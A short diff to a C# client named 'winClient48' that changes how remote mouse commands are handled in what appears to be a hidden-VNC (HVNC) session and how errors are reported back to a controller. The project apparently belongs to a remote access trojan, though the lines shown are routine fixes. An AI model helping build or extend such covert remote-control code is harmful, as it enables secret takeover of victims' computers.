@@ -1659,7 +1659,15 @@ namespace winClient48
 
                         int x = int.Parse(cmd[2]);
                         int y = int.Parse(cmd[3]);
-                        funcHvncSession.fnHandleMouseInput("move", x, y);
+
+                        try
+                        {
+                            funcHvncSession.fnHandleMouseInput("move", x, y);
+                        }
+                        catch (Exception ex)
+                        {
+
+                        }
                     }
                     else if (cmd[1] == "btn")
                     {
@@ -1698,7 +1706,7 @@ namespace winClient48
                         {
                             int delta = int.Parse(cmd[5]);
                             IntPtr wParam = (IntPtr)((delta << 16));
-                            IntPtr hWnd = WinAPI.WindowFromPoint(new Point(x, y));
+                            IntPtr hWnd = WinAPI.WindowFromPoint(x, y);
                             WinAPI.PostMessage(hWnd, 0x020A, wParam, (IntPtr)((y << 16) | (x & 0xFFFF)));
                         }
                         else
@@ -2994,7 +3002,7 @@ namespace winClient48
             }
             catch (Exception ex)
             {
-                //MessageBox.Show(ex.Message, "winClient48");
+                MessageBox.Show(ex.Message, "winClient48");
                 v.SendCommand($"error|{clsCrypto.b64E2Str(ex.Message)}");
             }
         }
